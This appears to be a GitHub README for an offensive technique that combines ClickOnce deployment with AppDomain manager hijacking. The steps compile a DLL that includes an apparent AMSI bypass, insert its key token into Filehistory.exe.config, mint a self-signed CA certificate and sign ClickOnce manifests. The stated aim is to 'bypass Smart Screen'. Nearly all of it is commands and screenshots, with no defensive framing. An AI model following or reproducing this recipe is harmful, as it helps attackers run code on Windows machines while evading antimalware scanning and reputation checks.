# Click-Once-App-Domain
Click Once + App Domain

csc.exe /t:library /keyfile:key.snk /out:uevmonitor.dll uevmonitor.cs amsi.cs

[System.Reflection.AssemblyName]::GetAssemblyName("uevmonitor.dll").FullName            

uevmonitor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=1bb626af4620f3e6

Add PublicKeyToken to Filehistory.exe.config

makecert -r -pe -n "CN=test" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv cert.pvk CA.cer

pvk2pfx -pvk cert.pvk -spc CA.cer -pfx CA.pfx -po "test"

MageUI.exe

Create application manifest:

![image](https://github.com/weaselsec/Click-Once-App-Domain/assets/147257425/38a9d058-2d7e-4dca-a0cd-92979b5f346b)

Sign and save the application manifest:

![image](https://github.com/weaselsec/Click-Once-App-Domain/assets/147257425/83b0ddac-ff62-496f-a9a8-6b71163636d7)

Create deployment manifest:

![image](https://github.com/weaselsec/Click-Once-App-Domain/assets/147257425/9d76f5ca-4765-4e08-b9f3-2863b7b36035)

Add the application manifest:

![image](https://github.com/weaselsec/Click-Once-App-Domain/assets/147257425/75430ed5-4618-43c9-98a2-a5dce1308d9f)

Sign and save the deployment manifest:

![image](https://github.com/weaselsec/Click-Once-App-Domain/assets/147257425/faeaf363-9553-4104-ad9e-0378fb9bf9c7)

Launch and execute to bypass Smart Screen:

![image](https://github.com/weaselsec/Click-Once-App-Domain/assets/147257425/3b903b58-2314-4e0f-9c3f-5a1a5d9aaee9)












